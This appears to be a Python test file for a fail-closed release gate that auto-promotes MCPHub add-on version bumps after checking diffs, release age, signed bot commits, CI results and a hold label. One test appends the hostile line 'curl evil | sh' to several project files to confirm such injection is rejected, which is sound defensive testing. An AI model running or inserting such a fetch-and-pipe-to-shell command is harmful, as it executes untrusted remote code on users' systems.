"""Regression checks for the fail-closed MCPHub auto-promotion gates."""
import importlib.util
import os
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

path = Path(__file__).resolve().parents[1] / "scripts" / "auto_promote_mcphub.py"
spec = importlib.util.spec_from_file_location("auto_promote", path)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)

REPO = "x/y"
NOW = 1_800_000_000.0
STABLE = {
    "MCPHub/build.yaml": '---\nbuild_from:\n  amd64: "samanhappy/mcphub:1.1.7"\n'
                         '  aarch64: "samanhappy/mcphub:1.1.7"\n',
    "MCPHub/Dockerfile": "ARG OPENAI_TUNNEL_VERSION=v0.0.16\nARG BUILD_FROM=samanhappy/mcphub:1.1.7\n"
                         "# MCPHub 1.1.7 listens on all interfaces upstream.\n",
    "MCPHub/config.yaml": '---\nname: "MCPHub"\nversion: "v2026.10.20-1"\ndescription: >-\n'
                          "  MCPHub 1.1.7 - central MCP server management\n",
    "MCPHub/NOTICE.md": "- Version currently packaged: 1.1.7\n\n- Version currently packaged: v0.0.16\n",
    "MCPHub/ingress.conf": 'return 200 "{\\"version\\":\\"1.1.7\\"}";\n',
    "MCPHub/patch_home_assistant_auth.py": '"""Patch MCPHub 1.1.7."""\n',
    "MCPHub/run.sh": 'log_info "Starting MCPHub 1.1.7."\n',
    "MCPHub/CHANGELOG.md": "# Changelog\n\n## v2026.10.20-1\n\n### Changed\n\n- Earlier.\n",
}


def bumped(**overrides):
    files = {}
    for name, text in STABLE.items():
        files[name] = (text.replace("1.1.7", "1.1.8").replace("v0.0.16", "v0.0.17")
                       .replace("v2026.10.20-1", "v2026.10.22"))
    files["MCPHub/CHANGELOG.md"] = (
        "# Changelog\n\n## v2026.10.22\n\n### Changed\n\n"
        "- Updated bundled OpenAI tunnel-client v0.0.16 to v0.0.17.\n\n"
        "## v2026.10.21\n\n### Changed\n\n- Updated MCPHub from 1.1.7 to 1.1.8.\n\n"
        + STABLE["MCPHub/CHANGELOG.md"][len("# Changelog\n\n"):]
    )
    files.update(overrides)
    return files


def iso(seconds):
    from datetime import datetime, timezone
    return datetime.fromtimestamp(seconds, timezone.utc).isoformat().replace("+00:00", "Z")


class ContentTests(unittest.TestCase):
    def test_accepts_pure_version_bumps(self):
        self.assertEqual(mod.check_content(STABLE, bumped()), {
            "upstream": ("1.1.7", "1.1.8"), "tunnel": ("v0.0.16", "v0.0.17"),
        })

    def test_rejects_any_other_change(self):
        for name in ("MCPHub/run.sh", "MCPHub/Dockerfile", "MCPHub/config.yaml"):
            with self.subTest(file=name), self.assertRaisesRegex(ValueError, "more than"):
                mod.check_content(STABLE, bumped(**{name: bumped()[name] + "curl evil | sh\n"}))

    def test_rejects_stale_notice(self):
        # The tunnel updater once forgot NOTICE.md; such a state must not ship.
        stale = bumped()["MCPHub/NOTICE.md"].replace("v0.0.17", "v0.0.16")
        with self.assertRaisesRegex(ValueError, "NOTICE"):
            mod.check_content(STABLE, bumped(**{"MCPHub/NOTICE.md": stale}))

    def test_rejects_changelog_edits(self):
        notes = bumped()["MCPHub/CHANGELOG.md"]
        for text in (notes.replace("- Earlier.", "- Rewritten."),
                     notes.replace("### Changed\n\n- Updated MCPHub", "### Added\n\n- Updated MCPHub"),
                     notes.replace("1.1.8.\n", "1.1.8.\n- Also something manual.\n", 1)):
            with self.subTest(text=text[:60]), self.assertRaises(ValueError):
                mod.check_content(STABLE, bumped(**{"MCPHub/CHANGELOG.md": text}))

    def test_major_update_stays_manual(self):
        files = {name: text.replace("1.1.8", "2.0.0") for name, text in bumped().items()}
        with self.assertRaisesRegex(mod.Skip, "Major upstream"):
            mod.check_content(STABLE, files)

    def test_minor_update_is_automatic(self):
        files = {name: text.replace("1.1.8", "1.2.0") for name, text in bumped().items()}
        self.assertEqual(mod.check_content(STABLE, files)["upstream"], ("1.1.7", "1.2.0"))

    def test_rejects_downgrade_and_unchanged_app_version(self):
        with self.assertRaisesRegex(ValueError, "downgrade"):
            mod.check_content(bumped(), STABLE)
        same = {name: text.replace("v2026.10.22", "v2026.10.20-1") for name, text in bumped().items()}
        with self.assertRaisesRegex(ValueError, "App version"):
            mod.check_content(STABLE, same)


class ReleaseTests(unittest.TestCase):
    def test_release_age_and_stability(self):
        old = {"draft": False, "prerelease": False, "published_at": iso(NOW - 49 * 3600)}
        mod.check_release(old, NOW, "x")
        with self.assertRaises(mod.Skip):
            mod.check_release({**old, "published_at": iso(NOW - 47 * 3600)}, NOW, "x")
        for change in ({"prerelease": True}, {"draft": True}, {"published_at": None}):
            with self.subTest(change=change), self.assertRaises((ValueError, mod.Skip)):
                mod.check_release({**old, **change}, NOW, "x")


class ProvenanceTests(unittest.TestCase):
    sha = "a" * 40
    subject = "chore(mcphub): update upstream to 1.1.8 (#93)"
    commit = {"committer": {"login": "web-flow"}, "commit": {"verification": {"verified": True}}}
    pr = {"number": 93, "merged": True, "merge_commit_sha": "a" * 40,
          "title": "chore(mcphub): update upstream to 1.1.8", "user": {"login": mod.BOT},
          "base": {"ref": "dev-mcphub"}, "head": {"repo": {"full_name": REPO}}}

    def test_accepts_signed_bot_squash(self):
        mod.check_squash(self.commit, self.pr, REPO, self.sha, self.subject)
        mod.check_squash(self.commit, {**self.pr, "title": "chore(mcphub): update OpenAI tunnel client"},
                         REPO, self.sha, "chore(mcphub): update OpenAI tunnel client (#93)")

    def test_human_commit_stays_manual(self):
        with self.assertRaises(mod.Skip):
            mod.check_squash(self.commit, self.pr, REPO, self.sha, "feat(mcphub): something")

    def test_rejects_forged_commits(self):
        cases = [
            ({"committer": {"login": "someone"}, "commit": self.commit["commit"]}, self.pr),
            ({**self.commit, "commit": {"verification": {"verified": False}}}, self.pr),
            (self.commit, {**self.pr, "user": {"login": "someone"}}),
            (self.commit, {**self.pr, "merge_commit_sha": "b" * 40}),
            (self.commit, {**self.pr, "base": {"ref": "main"}}),
            (self.commit, {**self.pr, "merged": False}),
            (self.commit, {**self.pr, "number": 94}),
        ]
        for commit, pr in cases:
            with self.subTest(commit=commit, pr=pr), self.assertRaises(ValueError):
                mod.check_squash(commit, pr, REPO, self.sha, self.subject)


class CiTests(unittest.TestCase):
    def test_skipped_and_cancelled_runs_never_count(self):
        runs = [
            {"head_sha": "s", "status": "completed", "conclusion": "skipped", "created_at": "3"},
            {"head_sha": "s", "status": "completed", "conclusion": "cancelled", "created_at": "2"},
        ]
        with patch.object(mod, "api", return_value={"workflow_runs": runs}):
            self.assertEqual(mod.ci_state(REPO, "w", lambda r: r["head_sha"] == "s"), "missing")
        runs.append({"head_sha": "s", "status": "completed", "conclusion": "failure", "created_at": "1"})
        with patch.object(mod, "api", return_value={"workflow_runs": runs}):
            self.assertEqual(mod.ci_state(REPO, "w", lambda r: r["head_sha"] == "s"), "failed")

    def test_latest_run_decides(self):
        runs = [
            {"head_sha": "s", "status": "completed", "conclusion": "failure", "created_at": "1"},
            {"head_sha": "s", "status": "in_progress", "conclusion": None, "created_at": "2"},
        ]
        with patch.object(mod, "api", return_value={"workflow_runs": runs}):
            self.assertEqual(mod.ci_state(REPO, "w", lambda r: True), "running")


class GitHistoryTests(unittest.TestCase):
    """Uses a real throw-away repository for merge and candidate checks."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.cwd = os.getcwd()
        os.chdir(self.tmp.name)
        self.addCleanup(os.chdir, self.cwd)
        self.git("init", "-q", "-b", "main")
        self.git("config", "user.name", "t")
        self.git("config", "user.email", "t@example.invalid")
        self.git("config", "commit.gpgsign", "false")
        self.write(STABLE)
        self.main = self.commit("stable")

    def git(self, *arguments):
        return subprocess.run(["git", *arguments], check=True, capture_output=True,
                              text=True).stdout.strip()

    def write(self, files):
        for name, text in files.items():
            Path(name).parent.mkdir(parents=True, exist_ok=True)
            Path(name).write_text(text, encoding="utf-8", newline="\n")

    def commit(self, message):
        self.git("add", "-A")
        self.git("commit", "-q", "-m", message)
        return self.git("rev-parse", "HEAD")

    def history(self, dev):
        with patch.object(mod, "api", return_value={}), patch.object(mod, "check_squash"):
            return mod.check_history(REPO, self.main, dev)

    def test_bot_commit_and_clean_main_sync_pass(self):
        self.git("switch", "-q", "-c", "dev")
        self.write(bumped())
        self.commit("chore(mcphub): update upstream to 1.1.8 (#93)")
        self.git("switch", "-q", "main")
        Path("README.md").write_text("docs\n", encoding="utf-8")
        self.main = self.commit("docs: readme")
        self.git("switch", "-q", "dev")
        self.git("merge", "-q", "--no-ff", "-m", mod.SYNC_SUBJECT, "main")
        self.assertGreater(self.history(self.git("rev-parse", "HEAD")), 0)

    def test_edited_merge_is_rejected(self):
        self.git("switch", "-q", "-c", "dev")
        self.write(bumped())
        self.commit("chore(mcphub): update upstream to 1.1.8 (#93)")
        self.git("switch", "-q", "main")
        Path("README.md").write_text("docs\n", encoding="utf-8")
        self.main = self.commit("docs: readme")
        self.git("switch", "-q", "dev")
        self.git("merge", "-q", "--no-ff", "--no-commit", "main")
        Path("MCPHub/run.sh").write_text("evil\n", encoding="utf-8")
        dev = self.commit(mod.SYNC_SUBJECT)
        with self.assertRaisesRegex(ValueError, "clean merge"):
            self.history(dev)

    def test_files_outside_update_set_stay_manual(self):
        self.git("switch", "-q", "-c", "dev")
        Path("MCPHub/server.js").write_text("x\n", encoding="utf-8")
        dev = self.commit("chore(mcphub): update upstream to 1.1.8 (#93)")
        with self.assertRaisesRegex(mod.Skip, "outside"):
            self.history(dev)

    def test_nothing_to_release(self):
        with self.assertRaises(mod.Skip):
            self.history(self.main)

    def test_candidate_may_only_touch_changelog(self):
        self.git("switch", "-q", "-c", "dev")
        self.write(bumped())
        dev = self.commit("bump")
        mod.check_candidate(dev, dev)
        Path("MCPHub/CHANGELOG.md").write_text("# Changelog\n\n## v2026.10.22\n", encoding="utf-8")
        good = self.commit("docs: consolidate")
        mod.check_candidate(dev, good)
        Path("MCPHub/run.sh").write_text("evil\n", encoding="utf-8")
        bad = self.commit("evil")
        with self.assertRaises(ValueError):
            mod.check_candidate(dev, bad)
        self.git("reset", "-q", "--hard", dev)
        Path("MCPHub/run.sh").write_text("evil\n", encoding="utf-8")
        with self.assertRaises(ValueError):
            mod.check_candidate(dev, self.commit("evil only"))


class GateTests(unittest.TestCase):
    def test_haos_test_is_mandatory(self):
        states = {"validate-mcphub.yml": "success", "haos-qemu-mcphub.yml": "missing"}
        with patch.object(mod, "git", return_value=""), \
             patch.object(mod, "api", return_value=[]), \
             patch.object(mod, "check_history", return_value=NOW - 50 * 3600), \
             patch.object(mod, "show", side_effect=lambda sha, name: (STABLE if sha == "m" else bumped())[name]), \
             patch.object(mod, "check_release"), \
             patch.object(mod, "ci_state", side_effect=lambda repo, workflow, _: states[workflow]):
            mod.git.side_effect = lambda *a: {
                ("rev-parse", "origin/main"): "m", ("rev-parse", "origin/dev-mcphub"): "d",
                ("diff", "--name-only", "m", "d"): "\n".join(mod.ALLOWED_FILES),
            }.get(a, str(NOW - 30 * 3600) if a[0] == "log" else "")
            self.assertEqual(mod.gate(REPO, NOW)["action"], "haos")
            states["haos-qemu-mcphub.yml"] = "running"
            self.assertEqual(mod.gate(REPO, NOW)["action"], "wait")
            states["haos-qemu-mcphub.yml"] = "failed"
            with self.assertRaisesRegex(ValueError, "Home Assistant OS"):
                mod.gate(REPO, NOW)
            states["haos-qemu-mcphub.yml"] = "success"
            self.assertEqual(mod.gate(REPO, NOW)["action"], "promote")
            states["validate-mcphub.yml"] = "missing"
            self.assertEqual(mod.gate(REPO, NOW)["action"], "validate")

    def test_hold_label_stops_everything(self):
        pr = {"head": {"ref": mod.RELEASE}, "labels": [{"name": "hold"}]}
        with patch.object(mod, "git", return_value="x"), patch.object(mod, "api", return_value=[pr]):
            with self.assertRaisesRegex(mod.Skip, "hold"):
                mod.gate(REPO, NOW)


if __name__ == "__main__":
    unittest.main()
